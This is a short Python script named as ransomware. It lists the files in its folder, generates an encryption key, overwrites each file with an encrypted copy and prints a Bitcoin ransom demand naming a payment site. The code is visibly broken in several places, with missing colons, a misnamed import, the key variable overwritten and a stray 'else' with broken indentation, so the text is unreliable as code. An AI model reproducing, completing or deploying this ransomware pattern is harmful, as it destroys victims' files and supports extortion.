#!/usr/bin/env python3 

# Encrypt

import os 
from cryptography.fernet import fernet

# Find files

files = []

for file in os.listdir()
    if file == "ransomware.py" or file =="key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file)
        files.append(file)
        
print(files)

key = fernet.generate_key()

with open("key.key", "wb") as key:
    key.write(key)
    
for file in files:
    with open(file,"rb") as thefile:
            contents = thefile.read()
    contents_encrypted = fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
   
   print("Your files have been encrypted visit rofllmao.com/paymebitcoin to provide payment and receive the key"\n)
   
  else:    
        
  print("")
  

  
 
  
